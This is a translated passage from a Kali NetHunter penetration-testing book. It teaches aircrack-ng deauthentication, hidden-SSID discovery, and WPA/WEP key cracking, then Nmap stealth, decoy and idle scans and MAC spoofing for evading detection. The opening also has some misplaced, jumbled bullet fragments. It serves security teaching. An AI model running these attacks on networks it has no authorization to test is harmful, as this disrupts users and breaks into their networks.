+   ![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/48b760bf-8f2b-46e9-8e8d-595b756f63fd.jpg)

+   无线加密标准

+   无线威胁

+   在“独立基本服务集”（IBSS）中，这种设计/拓扑中没有接入点或无线路由器。每个客户端设备都通过 IEEE 802.11 标准与其他设备建立连接。这被称为自组织网络：

+   蓝牙黑客

在无线网络出现之前，每个设备都需要一根物理电缆，将设备的网络接口卡（NIC）连接到网络交换机，以便与其他设备通信和共享资源。使用有线网络的主要限制是，诸如计算机或服务器等终端设备受到网络电缆长度的限制。与大多数类别（CAT）电缆一样，如 CAT 5、5e 和 6，最大电缆长度为 100 米。此外，不得不携带非常长的电缆四处移动有时对某些用户来说太令人沮丧了。

IEEE 802.11 标准的创建，使用无线电信道，为现代无线网络铺平了道路。

以下是使用 IEEE 802.11 无线网络的一些优势：

+   它消除了需要为每个终端设备布线的需求

+   它为难以铺设网络电缆的区域提供网络连接

+   它允许设备在接入点（AP）或无线路由器的范围内漫游

然而，使用无线网络也会引发一些问题。以下是使用 IEEE 802.11 的一些缺点：

+   由于安全漏洞，无线加密可能会被破解

+   无线网络的带宽通常低于有线网络

+   无线认证模式

+   信号随距离减弱

# 无线网络拓扑

在本节中，我们将讨论各种类型的无线网络拓扑。在攻击无线网络之前，渗透测试人员应该了解无线网络设计以及客户端如何相互连接。

# 独立基本服务集

受其他无线发射设备的干扰

无线攻击

# 基本服务集

在“基本服务器集”（BSS）设计中，所有客户端都通过无线路由器或接入点相互连接。无线路由器或接入点负责在客户端和有线网络之间传输网络流量。这种类型的拓扑也被称为基础设施模式：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/679c4f79-d192-46bd-8262-873ab4263474.jpg)

# 扩展服务集

“扩展服务集”（ESS）模式与 BSS 非常相似。在 ESS 中，有多个接入点或无线路由器连接到同一有线网络。这种设计对于在建筑物或园区内延伸无线信号非常有用，允许用户在漫游时访问网络内的资源：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d5c62cd3-7627-4c46-aff3-271163066911.jpg)

# 无线标准

**电气和电子工程师学会**（**IEEE**）在计算和信息技术行业内制定了许多标准。一个非常受专业人士欢迎的标准是 IEEE 802.11 标准，该标准规定了无线通信在 2.4 GHz 和 5 GHz 频率上的操作方式。普通消费者则以另一个名称了解这项技术：Wi-Fi。

以下表格概述了 IEEE 802.11 标准的不同变体，以及它们的操作频率和最大带宽容量：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d52e178c-e2a1-4256-98ed-bb7e0c466d5b.png)

如果您的目标是在 5 GHz 频率上运行的无线网络，而您的无线网络适配器使用的是标准频率，即仅在 2.4 GHz 上运行，您将无法成功对目标网络执行任何攻击。

# 服务集标识符

**服务集标识符**（**SSID**）通常被称为无线网络的名称，它被笔记本电脑、智能手机和其他移动设备所看到。 SSID 用于帮助我们区分一个特定的网络与另一个网络。接入点或无线路由器通过广播消息不断地广告其 SSID，而客户端（如笔记本电脑）捕获这些广播消息（更为人所知的是信标）以获取其中包含的 SSID。

SSID 通常是人类可读的文本或最大长度为 32 字节的字符。以下是安卓平板电脑发现的 SSID 示例：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/7d658a0b-0880-4cf5-b00c-88d8d298d1a6.jpg)

# 无线认证模式

在无线网络上，客户端设备通常有三种不同的方式可以对无线路由器或接入点进行认证：

+   开放认证

+   共享密钥认证

+   集中式认证

开放认证系统非常简单。无线路由器或接入点未配置密码，只是向附近的所有人广播其 SSID。希望连接的客户端可以自由连接，无需在获得无线网络访问权限之前提供任何凭据或身份。开放认证的一个例子是公共区域和场所（如咖啡店）中的免费热点服务。

在共享密钥认证系统中，无线路由器或接入点配置了预共享密钥（PSK）。这种方法允许客户端只有在能够提供正确密钥的情况下才能连接到无线网络。没有适当密钥的客户端将被拒绝访问。这种方法在家庭网络中最常见。

在集中式认证中，使用集中式认证服务器来管理网络用户帐户、权限和计费。无线路由器或接入点未配置秘密密钥，而是与集中式认证系统通信，以查询无线网络上的每次登录尝试。假设用户想要将其笔记本电脑连接到无线网络，因此他们选择适当的 SSID 并尝试连接。无线路由器向用户发送登录请求。用户被提示输入他们的网络用户凭据；然后无线路由器将登录凭据发送到认证服务器进行验证。如果通过，认证服务器告诉无线路由器允许访问并为用户分配某些特权。如果帐户无效，认证服务器告诉无线路由器不要授予网络访问权限。这种方法通常在企业网络中找到：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e75522c0-2250-46cd-a2c5-21d19a215215.jpg)

**远程认证拨号用户服务（RADIUS）**和**终端访问控制器访问控制系统加强版（TACACS+）**都是集中式认证服务器的例子。

# 无线加密标准

作为渗透测试人员，了解各种无线加密及其标准是很重要的。

# 有线等效隐私

**Wired Equivalent Privacy**（**WEP**）标准是在 IEEE 802.11 网络中实施的第一个加密标准。它旨在在接入点和客户端之间的所有无线通信中提供数据机密性。WEP 使用**RC4**加密密码/算法来确保传输过程中的机密性；然而，WEP 加密标准使用**24 位初始化向量（IV）**。在这种情况下，IV 用于为 RC4 加密算法创建密码流。

以下是 WEP 的各种密钥大小：

+   64 位 WEP 使用 40 位密钥

+   128 位 WEP 使用 104 位密钥

+   256 位 WEP 使用 232 位密钥

WEP 多年来以其设计缺陷而闻名，并且在应用于 IEEE 802.11 网络时被认为是安全漏洞。

# Wi-Fi Protected Access

**Wi-Fi Protected Access**（**WPA**）是为 IEEE 802.11 网络设计的另一种加密标准，是 WEP 标准的后继者。WPA 利用**暂态密钥完整性协议**（**TKIP**），使用**RC4**密码（每个数据包 128 位）进行数据加密（机密性）。然而，TKIP 通过简单地增加**初始化向量**（**IVs**）的大小并混合它们的功能来减轻了 WEP 的漏洞。**128 位暂态密钥**与客户端设备的**媒体访问控制**（**MAC**）地址和 IVs 相结合，然后用于数据加密。

# Wi-Fi Protected Access 2

**Wi-Fi Protected Access 2**（**WPA2**）是 IEEE 802.11 无线网络的 WPA 加密标准的后继者。该标准使用**高级加密标准**（**AES**），比 RC4 加密密码套件更优越。AES 提供更强的数据块加密以确保数据机密性。此外，WPA2 应用**计数器模式与密码块链接消息认证码协议**（**CCMP**），比 TKIP 更优越。CCMP 使用 128 位密钥进行数据加密，以与 AES 一起提供机密性，从而创建 128 位数据块。

有关无线安全标准的更多信息可以在 Wi-Fi 联盟网站上找到：[`www.wi-fi.org/discover-wi-fi/security`](https://www.wi-fi.org/discover-wi-fi/security)。

# 无线威胁

在使用无线网络时存在以下安全威胁：

+   **Rogue access point**：有时，渗透测试人员需要检查公司无线网络的安全状况和员工的安全意识。**Rogue access point**是指渗透测试人员设置一个*假*接入点，带有一个 SSID 来欺骗用户建立连接。想象一下，在一个**Rogue access point**上创建一个名为*Company XYZ VIP Access*的 SSID，并将其保持开放。看到这个名字的很多人会认为这个无线网络上有特殊资源。这种技术将允许渗透测试人员轻松地嗅探流量并获取敏感数据。

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/2b1650da-1556-4701-931b-5ae03e0883ae.jpg)

+   **Evil twin**：**Evil twin**设置与**Rogue access point**配置有些相似。然而，使用**Evil twin**，渗透测试人员在企业网络中部署一个接入点，使用与实际组织相同的 SSID。当用户连接时，他们将能够访问本地资源，而不会意识到他们已连接到未经授权的接入点。这将允许渗透测试人员轻松地拦截和嗅探流量。

+   **AP 和客户端 MAC 欺骗**：渗透测试人员可以记录接入点和关联的客户端的 MAC 地址。捕获这些信息将允许渗透测试人员模仿接入点欺骗受害者连接，或者使用客户端的 MAC 地址与启用 MAC 过滤功能的接入点建立连接。

+   **去认证攻击**：渗透测试人员向接入点发送特制的数据包，目的是在接入点和其连接的客户端设备之间创建一个取消关联。简而言之：去认证攻击将导致接入点踢掉一个或多个客户端。这种攻击还有以下好处：

+   发现隐藏的 SSID。这是通过监视客户端设备发送的探测包及其与接入点的关联来完成的。

+   捕获用于破解无线网络密码的 WPA2 握手。

# 无线攻击

对于以下大多数攻击，我们将使用 aircrack-ng 套件工具来帮助我们实现我们的目标。

**Aircrack-ng**可以在[www.aircrack-ng.org](http://www.aircrack-ng.org)找到。

# 练习-检查无线网卡是否支持注入

确定您的无线网卡是否支持数据包注入的一种快速简便的方法是使用`aireplay-ng`工具。使用`aireplay --test <*interface*>`命令将测试数据包注入。

以下是使用该命令的演示。如您所见，我们的网卡支持数据包注入：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d4ea5890-920e-438c-927e-e8fc8dcce420.png)

此外，可以使用`-9`参数代替`--test`。

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1d309638-8232-46fe-b699-43e44230babd.png)

如果您仔细观察输出，您会看到每个接入点的数据包丢失比例。

# 练习-检测接入点及其制造商

我们可以检测到 Kali NetHunter 设备范围内的每个接入点。我们将能够确定以下内容：

+   接入点的 MAC 地址或 BSSID

+   通过显示 PWR 值来显示其信号评级

+   其加密标准、密码和认证方法

+   网络名称或 ESSID

要开始，请确保您的无线网络适配器处于监控模式。在启用监控模式之前，我们需要确保没有任何可能妨碍此过程的进程。因此，我们使用以下命令来终止任何此类进程：

```
airmon-ng check kill
```

现在我们可以使用以下命令将我们的网络适配器配置为监控模式：

```
airmon-ng start wlan1
```

您的设备将开始在空中捕获信标和探测包：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/056294dd-0e26-4bc4-a352-cc73401d077d.jpg)

按下键盘上的*A*键将允许您循环浏览各种过滤器。这些过滤器包括仅查看接入点、仅查看客户端、仅查看接入点和客户端，最后，仅查看接入点、客户端和确认消息。

让我们确定一个产品的制造商，可以帮助研究有关特定供应商产品的已知漏洞。**airodump-ng**工具将识别特定制造商的接入点，我们可以使用`airodump-ng <*interface*> --manufacturer`命令来实现这一点：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/05b97c78-7612-4210-9dc2-2739b716f318.jpg)

# 练习-发现接入点的 WPS 版本

在这个练习中，我们将在 Kali NetHunter 上使用**airodump-ng**工具的附加参数。使用`--bssid`语法指定要定位的接入点，`-c`告诉无线网络适配器监听特定信道，将帮助我们监视特定的无线网络。我们将使用`--wps`来指示目标接入点的 WPS 模式和版本：

```
airodump-ng --bssid <bssid value> -c <channel number> <monitoring interface> --wps 
```

运行上述命令后，我们将得到以下输出：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1f270500-6c8a-48cb-a2ef-5d436e2823ef.jpg)

执行我们的命令后，我们得到以下结果：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/24da979f-6dda-495f-87fb-d95fc53d56c0.jpg)

我们可以看到这个接入点已启用 WPS 并且正在使用版本 2。

# 练习-去认证攻击

去认证攻击只是试图将所有关联/连接的客户端从接入点踢出。在这个练习中，我们将使用**aireplay-ng**工具来帮助我们完成我们的任务：

1.  确保您的无线网卡处于监控模式。

1.  使用**airodump-ng**获取您的目标的 BSSID。

1.  使用`aireplay -0 0 –a <*目标的 BSSID*> <*监控接口*>`命令向目标接入点发送持续的去认证帧流。结果将使所有连接的客户端从网络中断开：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5961db56-998e-49a6-8d1a-abfb309dfc40.jpg)

aireplay-ng 工具支持许多攻击模式。以下截图来自 aireplay-ng 的*手册*页面：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/338d51dd-ace8-453a-bfce-7b90059e24f9.jpg)

# 练习-去认证特定客户端

如果你在无线网络上针对特定客户端，我们可以使用以下命令向接入点发送去认证帧，但只断开指定的客户端。

使用`airodump-ng --bssid <*目标的 BSSID*> -c <*频道号*> <*监控接口*>`命令来主动监视目标网络：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/322a4592-fa57-4792-8fc8-045ae49c2ce3.jpg)

如你所见，有一些与接入点关联的站点（客户端）。让我们尝试客户端解关联：

```
aireplay-ng -0 0 -a <target's bssid> -c <client's mac addr> wlan1mon
```

+   `-0`表示我们正在执行去认证攻击。

+   `0`具体指持续攻击。如果使用`2`，这意味着只向目标发送 2 个去认证消息。

+   `-c`允许你指定一个特定的站点（客户端设备）进行去认证。如果没有这个参数，攻击将使与接入点关联的所有客户端解关联。

运行上述命令后，我们将得到以下截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/30af9292-1110-46d7-b9fd-00c324ccafb8.jpg)

# 练习-检测去认证攻击

在本书的前面，我们看过了一个叫做**tcpdump**的神奇工具来捕获网络流量。使用这个工具的另一个好处是检测去认证攻击。由于攻击发生在空中，我们将能够看到它并确定其目标。

为此，我们可以使用`tcpdump -n -e -s0 -vvv -i wlan0 | grep DeAuth`命令。

+   `-n`指定不解析 IP 地址

+   `-e`表示打印 IEEE 802.11 和以太网流量类型的 MAC 地址

+   `-v`表示详细程度

+   `-i`指定接口

运行上述命令后，我们将得到以下输出：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/44cb443f-c0b1-475a-befc-4adee0379b2b.png)

上述截图中显示的 BSSID 表示受害者接入点。如果这是你的接入点，这表明你正受到黑客的攻击。

# 练习-发现隐藏的 SSID

许多组织倾向于在接入点上禁用其 SSID 的广播。十多年前，我们认为这是无线网络的安全配置。然而，通过先进的渗透测试工具和技术，渗透测试人员或安全审计员可以在几分钟内发现任何隐藏的 SSID。作为渗透测试人员，如果目标的无线网络对移动设备隐藏，你需要执行以下步骤：

1.  在无线网络适配器上启用监视模式。

1.  使用`airodump-ng <*监控接口*>`命令来显示所有附近的 ESSIDs。注意有一个网络的名称格式不寻常，`<length: 6>`。这表示接入点已禁用了 SSID 的广播：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/7dfd0be2-6837-46be-be69-1ebc4da7a02c.png)

1.  监视特定接入点，以确定是否有任何关联或连接的客户端。使用以下命令：

```
airodump-ng --bssid 68:7F:74:01:28:E1 -c 6 wlan0mon
```

运行上述命令后，我们将得到以下输出：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e00f9ff3-c2ca-45ca-899b-88e89e4b5011.jpg)

正如我们所看到的，目前有一个客户端连接。

1.  创建一个简短的去认证攻击，以在断开连接时强制客户端重新连接。在下面的截图中，我们将向目标接入点发送一个只有 20 帧的去认证攻击：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/4bf9530c-0d9e-4e15-b21c-3ece0ca113d0.png)

在我们的去认证攻击中途，客户端暂时断开连接并发送探测请求以寻找`dd-wrt`网络。一旦连接重新建立，airodump-ng 将探测信息（由站点/客户端发送）与 ESSID 和 BSSID 信息进行匹配。正如我们所看到的，SSID/ESSID 已经被揭示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ab27ca74-2911-4def-9cc8-2abf4ffa465f.jpg)

# 练习-破解 WEP 和 WPA

破解 WEP 和 WPA 的第一步是从目标无线网络中捕获足够的数据。我建议您使用`airodump-ng`捕获至少 15,000 个数据帧。我们可以使用以下命令来捕获并离线存储数据：

```
airodump-ng --bssid <*target access point*> -c <*channel*> wlan0mon –w <*output file*>
```

使用`-w`参数将允许`airodump-ng`将其数据写入指定的文件。我们将捕获足够的帧直到获得 WPA 握手：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/af3907d9-a83d-44a4-8d8f-6df30f4a168e.jpg)

正如您所看到的，我们能够捕获 WPA 握手。为增加客户端重新认证的可能性，您可以尝试使用去认证攻击；这将确保客户端在认证过程中提供秘钥。

使用`aircrack-ng <*file name*>`命令来验证无线接入点 ESSID、BSSID 以及是否已获取握手：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/06700d2d-3674-4247-850d-b1c85cd4d03d.jpg)

我们的下一步是尝试从捕获的数据中恢复预共享密钥（PSK）。我们将使用带有密码字典文件的**aircrack-ng**。要快速定位 Kali NetHunter 或 Kali Linux 中的预构建字典文件，请使用`locate`以下命令：

```
locate password.lst
```

运行上述命令后，我们将得到以下输出：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/3af92fcd-92e9-4c08-947c-9c231273373c.jpg)

现在是时候恢复预共享密钥（PSK）了；让我们使用以下命令：

`aircrack-ng dd-wrt-01.cap –w /usr/share/metasploit-framework/data/wordlists/password.lst`

一旦您在键盘上按下*Enter*，**aircrack-ng**将尝试进行字典攻击：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/b3690d0b-6974-4b6e-ae27-7c021b96d674.png)

正如您所看到的，预共享密钥（PSK）已成功获取。

# 破解 WEP 加密

破解 WEP 密码类似于破解 WPA/WPA2。在本小节中，我们将演示这种方法：

1.  要执行先前提到的数据包捕获，我们可以再次使用以下命令：

```
airodump-ng --bssid <target access point> -c <channel> wlan0mon –w <output file>
```

我建议您至少捕获 15,000 个数据帧并确保已获取握手。

1.  一旦握手获取到，确保您的.cap 文件已经离线保存。使用`ls -l *cap`命令查看我们目录中的所有.cap 文件：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a61b3034-8964-4700-b119-5e7930178205.png)

我们可以看到有两个捕获文件。在我们的练习中，我们将使用`ptw.cap`文件。

1.  让我们尝试一些 WEP 破解技术。要启动`aircrack-ng`，请使用以下命令：

```
aircrack-ng ptw.cap
```

一旦您按下*Enter*，`aircrack-ng`将尝试恢复 WEP 密钥：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/91678ab6-2541-4334-a0dc-3e7039295811.png)

正如您所看到的，我们已经找到了我们的密钥。

# 蓝牙黑客攻击

与 IEEE 802.11 网络上的无线黑客攻击类似，IEEE 802.15 网络上也存在蓝牙黑客攻击。众所周知，蓝牙连接是通过建立临时网络来实现的，距离较短：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/c186b656-2314-44da-ab42-dc6b0adeace2.jpg)

以下是各种类型的蓝牙攻击的简短列表：

+   **Bluejacking**：这允许恶意用户向另一台蓝牙连接的蓝牙设备发送未经请求的消息。

+   **Bluesnarfing**：这是指攻击者能够访问另一台蓝牙设备上的信息。信息可能包括受害者的电子邮件消息、他们的通讯录详细信息或短信消息。

+   **Bluesniffing**：搜索蓝牙启用设备的战争驾驶概念。

+   **蓝牙窃听**：这是指攻击者能够控制受害者的蓝牙设备。这使得攻击者能够监听电话通话并从受害者的设备发送消息。

# 摘要

在本章中，我们讨论了各种无线拓扑结构，因为渗透测试人员在攻击阶段之前和期间了解这些结构是很重要的。我们涵盖了当前的无线认证模式和加密标准，并研究了它们的相似之处和不同之处。此外，我们深入讨论了无线威胁，并探讨了各种渗透测试攻击。最后，我们涵盖了各种蓝牙攻击。

在下一章中，我们将讨论如何避免被检测到。您将学习各种在渗透测试期间保持隐秘的方法。


# 第九章：避免被检测

在本书的过程中，我们讨论了许多关于渗透测试阶段的主题，从获取利用信息到掩盖我们的踪迹。要执行成功的渗透测试而不被目标的安全团队察觉，您必须像黑客一样隐秘。

除了在渗透测试期间检测和利用漏洞外，组织还使用这种类型的服务来测试其现有的安全控制和检测率。

如 第二章 中所述，蓝队负责监视、检测和缓解母公司内的任何安全威胁。如果蓝队未能检测到渗透测试人员的活动，这意味着两件事：渗透测试人员非常隐秘，且组织的安全控制需要一些调整。

在本章中，我们将涵盖以下主题：

+   隐蔽扫描

+   使用诱饵

+   分段

+   空闲扫描

+   加密

让我们深入研究！

# 扫描

黑客的第二阶段是扫描阶段。如 [第二章](https://cdp.packtpub.com/hands_on_penetration_testing_with_kali_nethunter/wp-admin/post.php?post=35&action=edit#post_27) 中所讨论的，*了解渗透测试过程的阶段*，扫描阶段帮助渗透测试人员获取有关目标系统和/或网络的许多详细信息。可能获取的一些信息包括操作系统和构建编号、开放和关闭的服务端口、正在运行的应用程序及其服务版本，以及系统或设备组上是否存在特定的漏洞。

然而，扫描的过程将涉及我们的机器直接与目标系统或网络进行交互。作为一名有抱负的渗透测试人员，很重要的是要非常隐秘，并尽可能避免被目标安全系统检测到。

在对客户的网络基础设施进行渗透测试时，客户组织可能有一个积极监视安全局势的蓝队。如果您在渗透测试的早期或后期阶段被检测到，这将破坏模拟真实世界攻击的目的，因为黑客会尝试窃取数据和破坏系统。

在扫描阶段，渗透测试人员使用许多技术来避免被检测。以下是其中一些技术：

+   隐蔽扫描

+   使用诱饵

+   空闲扫描

+   欺骗

+   分段

# 隐蔽扫描

如果渗透测试人员尝试扫描目标，那么在实际扫描目标之前，TCP 三次握手建立的机会很高。**TCP 三次握手**最初是为网络上的所有基于 TCP 的通信建立的；一旦建立，数据的正常流动就会发生。

以下是一个演示两个设备之间 TCP 三次握手的图表。为了进一步解释 TCP 三次握手，让我们想象一下网络上有两个设备 A 和 B。假设设备 A 想要与设备 B 进行通信；设备 A 将发送一个 TCP **SYN**包给设备 B，作为启动对话的方法。当设备 B 收到 TCP **SYN**包时，它将用一个**SYN/ACK**包回应设备 A。当设备 A 收到一个**SYN/ACK**包后，它将通过发送一个 ACK 包来确认。在这一点上，这两个设备之间建立了一个 TCP 连接。

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/98a7facc-d5f9-4b3b-9397-cd270aa0305e.jpg)

在 TCP 连接期间，无论是 A 还是 B 设备收到的每个数据包，接收方都必须通过发送 TCP **ACK**数据包来确认接收，作为成功交付的指示。如果我们在执行端口扫描的同时与目标设备建立 TCP 会话，那么我们（攻击者）试图进行的侵入性行为就会变得明显。换句话说，这被认为是有噪音的。

在渗透测试的扫描阶段中，我们有 Nmap（网络映射器）工具来帮助我们。NMap 被誉为网络扫描器之王，因为它不仅是那些简单的 ping 扫描器之一，而且还可以包含许多对网络和安全专业人员非常有用的功能。其中一个功能是它能够在目标系统或网络上执行*隐形扫描*。

隐形扫描是如何工作的？：如第四章中所述，*扫描和枚举工具*，攻击者的机器会部分尝试与受害者的机器创建完整的 TCP 三次握手，发送一个 SYN 数据包；受害者会用一个**SYN/ACK**数据包回应，然而，攻击者不会完成握手，而是发送一个**RST**数据包。

受害者在收到**RST**数据包后，会关闭连接，认为攻击者的机器不再想要通信，但实际上攻击者是在挑衅受害者做出回应并提供一个开放端口的列表。一个开放的端口就像房子里敞开的门；留着一扇门开着，窃贼就可以轻易进入。这意味着如果一个端口被打开，攻击者可以利用这个开放的端口作为他们进入系统的途径。下面的图表展示了隐形扫描的工作原理：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ef81d885-ed6f-42f7-9860-2df605e45ec2.jpg)

使用 Nmap，我们可以通过输入命令`nmap –sS <*受害者 IP 地址*>`来执行隐形扫描：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/b9b53036-5369-4504-9628-64a4921db7ac.png)

`–sS`参数表示我们正在执行隐形扫描。隐形扫描有时被称为 TCP **SYN**扫描或全开放扫描。

# 欺骗

正如我们已经注意到的，每当渗透测试人员对目标设备或网络进行扫描时，攻击者的 IP 地址和 MAC 地址会被记录在受害者的机器上。这将使得在网络上识别攻击者的机器变得相当容易。在扫描时伪装自己的一种技术是使用欺骗，以使受害者在试图识别实际攻击者机器时产生困惑。

Nmap，网络扫描器之王，再次来帮助我们。Nmap 有能力在发送给目标设备的探测中插入多个源 IP 地址。为了更详细地说明，让我们想象一下，你给某人寄了一封虚假的信，然而在寄件人地址中，你在信封上加上了你的地址和其他几个地址。当信件被送到时，收件人不会确定实际寄件人，因为有多个来源地址。这使得确定探测的正确来源变得更加困难。要使用 Nmap 的欺骗功能，我们可以使用命令`nmap –D <欺骗 1, 欺骗 2, 欺骗 3…> <目标 IP 地址>`。

`-D`允许您指定多个源地址作为欺骗：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/b69bb98d-5960-42db-9947-0dad67f08555.jpg)

让我们使用 Wireshark 来查看攻击者机器和受害者之间实际发生的交易。攻击者机器的 IP 地址是 10.10.10.11，受害者机器是 10.10.10.100。我们使用了一个过滤器，只看 Wireshark 上发送到我们目标的流量：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/74ccd9c9-7aec-4923-8fd6-14db6c591a66.jpg)

正如我们在截图中看到的，有多个通过欺骗地址发送的探测，真实的 IP 地址被发送到目标。

# 空闲扫描

一种更老但仍然可用的扫描方法是使用空闲扫描技术。在空闲扫描中，攻击者机器（设备 A）向僵尸机器（设备 B）发送一个**SYN/ACK**数据包，以获取其分片标识号。

**IPID**有时被称为**IP 分片 ID**。在 TCP/IP 堆栈中，在设备将数据报（消息）发送到网络之前，它会被分成较小的片段，然后每个片段被发送到目的地。IPID 被分配给消息的这些较小片段（位），以指示它们属于同一个数据报或消息。

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/0974b11f-06e9-4214-9f6d-542c1950f027.jpg)

由于攻击者机器没有使用**SYN**数据包而是使用**SYN/ACK**数据包发起连接，因此僵尸机器知道它没有收到来自**SYN**数据包的正式初始化，因此发送一个带有僵尸机器的 IPID（设备 B）的**RST**数据包：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/0ca6ab2d-8e1c-4d45-84ef-82592cb3b203.jpg)

每次设备发送 IP 数据包时，**IPID**都会增加。

此时，攻击者机器从网络中的僵尸机器获得了 IPID（1234）。接下来，攻击者将使用僵尸机器的欺骗 IP 地址向实际受害者机器发送**SYN**数据包（检查是否有开放端口）。受害者将以**SYN/ACK**响应僵尸。僵尸知道它之前没有从受害者那里收到**SYN**数据包，然后将带有 IPID 的**RST**数据包响应：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ffaf1f38-f3f6-4aca-9004-710911e87f1c.jpg)

如果受害者的端口关闭，目标将向僵尸发送**RST**而不是**SYN/ACK**数据包：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/99fce076-e35d-4edf-9c68-809c340e0ae0.jpg)

最后，攻击者将再次探测僵尸以获取僵尸的 IPID。攻击者将发送**SYN/ACK**数据包。如果僵尸以 1236 的 IPID 响应，则受害者的端口已打开：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/036c64ce-4ac0-4eae-b11e-59dc7e19df59.jpg)

在最后阶段，如果僵尸的 IPID 没有增加 2（1,234 + 2 = 1,236），则受害者机器上的端口关闭。由于数据包在攻击者、僵尸和受害者机器之间发送，因此僵尸和目标的分片 ID 将增加，因为它们正在通信。我们可以使用 Nmap 执行空闲扫描，命令的语法是`nmap –Pn –sI <zombie IP addr> <target IP addr>`**。**

僵尸机器在这种扫描方法中是理想的，因为目标会认为探测是由僵尸机器而不是实际的攻击者机器进行的。

通过运行上述命令，您将获得以下屏幕截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/fd84f8f9-0f88-4d67-9a89-bcac000885fe.jpg)

您可以使用`man nmap`命令查看 Nmap 的手册页面，或者在终端窗口中键入`nmap`并按*Enter*。

# MAC 地址欺骗

正如我们所了解的，欺骗就是简单地让目标相信流量或请求是来自另一个设备或受信任的来源。由于 TCP/IP 协议套件并未设计用于现代安全威胁，因此 IP 和 MAC 地址都可以很容易地被欺骗。

为了防止网络中的 MAC 地址欺骗，网络安全专业人员可以在 Cisco IOS 交换机上实施**动态 ARP 检查（DAI）**。

要为接口生成和分配随机 MAC 地址，我们必须执行以下操作：

1.  使用`ifconfig wlan0 down`命令逻辑地关闭接口：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/3ba571c3-3613-40cf-a441-8a445d6668a6.jpg)

1.  使用`macchanger --show wlan0`命令验证指定接口的当前和永久 MAC 地址：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/9638673e-c896-4965-96f5-c36cd12029c2.png)

1.  使用**`macchanger --random wlan0`**命令为我们的`wlan0`接口生成和分配 MAC 地址：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/c97c8640-ba41-4d43-90d8-58f7d1dfe8c9.png)

1.  使用`ifconfig wlan0 up`命令重新启用接口：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a485d9a4-a450-4268-a369-3a6f27dd17f7.png)

此外，您可以使用**`macchanger –-help`**命令查看所有可用选项。

